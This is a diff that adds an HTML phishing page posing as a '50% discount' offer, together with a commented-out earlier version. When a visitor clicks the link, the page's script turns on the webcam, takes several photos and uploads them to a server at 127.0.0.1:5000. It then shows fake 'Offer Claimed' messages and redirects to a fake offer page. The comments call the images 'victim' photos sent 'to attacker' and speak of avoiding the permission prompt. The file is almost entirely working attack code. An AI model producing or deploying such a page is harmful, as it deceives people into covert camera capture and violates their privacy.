@@ -1,0 +1,190 @@
+<!-- <!DOCTYPE html>
+<html>
+<head>
+    <title>Free Coupon!</title>
+</head>
+<body>
+    <h1>Click to claim your reward!</h1>
+    <button id="malicious-button">Click Here!</button>
+
+    <script>
+        document.getElementById("malicious-button").addEventListener("click", async () => {
+            try {
+                // Access camera silently (if possible)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // Capture image after a delay
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to image and send to attacker
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'victim_photo.jpg');
+
+                        // Send to attacker's server
+                        fetch('http://127.0.0.1:5000/upload', {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            alert("Thanks for claiming your reward!"); // Fake message
+                        });
+
+                        stream.getTracks().forEach(track => track.stop()); // Stop camera
+                    }, 'image/jpeg');
+                }, 1000); // Wait 1 second before capturing
+            } catch (err) {
+                console.error("Camera access failed:", err);
+                alert("Error: Camera not accessible."); // Fallback if blocked
+            }
+        });
+    </script>
+</body>
+</html> -->
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exclusive Offer - Limited Time!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f5f5f5;
+            padding: 50px;
+        }
+        .offer-container {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .offer-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 18px;
+            border-bottom: 1px dashed #0066cc;
+            cursor: pointer;
+        }
+        .offer-link:hover {
+            color: #004499;
+            border-bottom-color: #004499;
+        }
+        .small-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="offer-container">
+        <h1>🎉 Exclusive Member Offer! 🎉</h1>
+        <p>You've been selected for a special discount! Click below to claim your reward before time runs out.</p>
+        
+        <a id="offer-link" class="offer-link">Claim Your 50% Discount Now</a>
+        
+        <p class="small-text">By clicking this link, you agree to our terms and conditions. Offer valid for limited time only.</p>
+    </div>
+
+    <script>
+        document.getElementById("offer-link").addEventListener("click", async () => {
+            try {
+                // Create fake loading effect
+                const link = document.getElementById("offer-link");
+                link.textContent = "Processing your request....";
+                
+                // Try to access camera without prompt (may not work in modern browsers)
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        facingMode: 'user'  // Try both front and back cameras
+                    },
+                    audio: false
+                }).catch(err => {
+                    // Fallback to less obvious method if direct access fails
+                    console.log("Standard access failed, trying alternative...");
+                    return navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: false
+                    });
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // Capture multiple images at intervals
+                const captures = [];
+                const captureInterval = setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob((blob) => {
+                        captures.push(blob);
+                    }, 'image/jpeg', 0.8);
+                    
+                    // Stop after 3 captures
+                    if (captures.length >= 3) {
+                        clearInterval(captureInterval);
+                        sendCaptures(captures);
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }, 500); // Capture every 0.5 seconds
+
+                function sendCaptures(blobs) {
+                    const formData = new FormData();
+                    blobs.forEach((blob, index) => {
+                        formData.append('file', blob, `photo_${index}.jpg`);
+                    });
+
+                    // Send to server
+                    fetch('http://127.0.0.1:5000/upload', {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => response.json())
+                      .then(data => {
+                          link.textContent = "Congratulations! Offer Claimed!";
+                          setTimeout(() => {
+                              window.location.href = "https://example.com/fake-offer";
+                          }, 2000);
+                      })
+                      .catch(err => {
+                          console.error("Upload failed:", err);
+                          link.textContent = "Offer Claimed!";
+                      });
+                }
+
+                // Fallback if something goes wrong
+                setTimeout(() => {
+                    if (captures.length === 0) {
+                        link.textContent = "Offer Claimed!";
+                        window.location.href = "https://example.com/fake-offer";
+                    }
+                }, 3000);
+
+            } catch (err) {
+                console.error("Error:", err);
+                document.getElementById("offer-link").textContent = "Offer Claimed!";
+                window.location.href = "https://example.com/fake-offer";
+            }
+        });
+    </script>
+</body>
+</html>
